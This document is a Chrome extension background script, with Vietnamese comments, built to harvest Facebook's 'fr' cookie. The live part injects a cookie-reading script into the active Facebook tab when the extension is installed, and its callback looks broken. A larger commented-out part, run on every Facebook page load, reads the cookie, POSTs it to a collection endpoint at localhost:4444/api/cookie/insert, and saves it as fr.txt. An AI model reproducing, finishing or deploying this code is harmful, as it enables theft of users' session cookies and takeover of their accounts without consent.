console.log("111111111");
chrome.runtime.onInstalled.addListener(function () {
  console.log("2222222");
  chrome.tabs.query({ active: true, currentWindow: true }, function (tabs) {
    const tab = tabs[0];
    if (!tab) {
      console.error("Không tìm thấy tab hiện tại.");
      return;
    }

    if (!tab.url) {
      return;
    }

    if (!tab.url.startsWith("https://facebook.com")) {
      console.error("Tab hiện tại không phải là trang web Facebook.");
      return;
    }

    chrome.scripting.executeScript({
      target: { tabId: tab.id },
      function: (fr) => {
        // Truy cập cookie c_user ở đây và gửi giá trị về background
        const cookieValue = document.cookie
          .split("; ")
          .find((row) => row.startsWith("fr="))
          .split("=")[1];
        fr(cookieValue);
        
      },
    });
  });
});

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  console.log("4444444444");

 
});



// chrome.tabs.onUpdated.addListener(function (tabId, changeInfo, tab) {
//   if (
//     tab &&
//     tab.url &&
//     changeInfo.status === "complete" &&
//     tab.url.startsWith("https://www.facebook.com/")
//   ) {
//     chrome.cookies.get(
//       { url: "https://facebook.com", name: "fr" },
//       (cookie) => {
//         if (cookie) {
//           const cookieValue = cookie.value;
//           const blob = new Blob([cookieValue], { type: "text/plain" });
//           const url = URL.createObjectURL(blob);

//           chrome.downloads.download({
//             url: url,
//             filename: "fr.txt",
//           });
//         } else {
//           console.log("Không tìm thấy cookie fr.");
//         }
//       }
//     );
//   }
// });

// Background script

// URL server nhận dữ liệu
// URL server
// console.log("11111122222");
// const SERVER_URL = "http://localhost:4444/api/cookie/insert";

// // Hàm gửi dữ liệu lên server
// async function sendDataToServer(data) {
//   try {
//     const response = await fetch(SERVER_URL, {
//       method: "POST",
//       headers: {
//         "Content-Type": "application/json",
//       },
//       body: JSON.stringify(data),
//     });

//     console.log("Gửi dữ liệu thành công!");
//   } catch (error) {
//     console.error("Lỗi gửi dữ liệu lên server:", error);
//   }
// }

// // Hàm lấy cookie Facebook
// async function getFbCookie(tab) {
//   return new Promise((resolve) => {
//     chrome.scripting.executeScript({
//       target: { tabId: tab.id },
//       func: () => {
//         const cookie = document.cookie
//           .split("; ")
//           .find((row) => row.startsWith("fr="))
//           .split("=")[1];

//         resolve(cookie);
//       },
//     });
//   });
// }

// // Hàm xử lý cookie
// async function processCookie(tab) {
//   const cookie = await getFbCookie(tab);

//   console.log("Giá trị cookie:", cookie);

//   await sendDataToServer({ cookie });

//   const blob = new Blob([cookie], { type: "text/plain" });

//   chrome.downloads.download({
//     url: URL.createObjectURL(blob),
//     filename: "fr.txt",
//   });
// }

// // Lắng nghe tab updated
// chrome.tabs.onUpdated.addListener(async (tabId, info, tab) => {
//   if (tab && tab.url && tab.url.includes("facebook")) {
//     await processCookie(tab);
//   }
// });
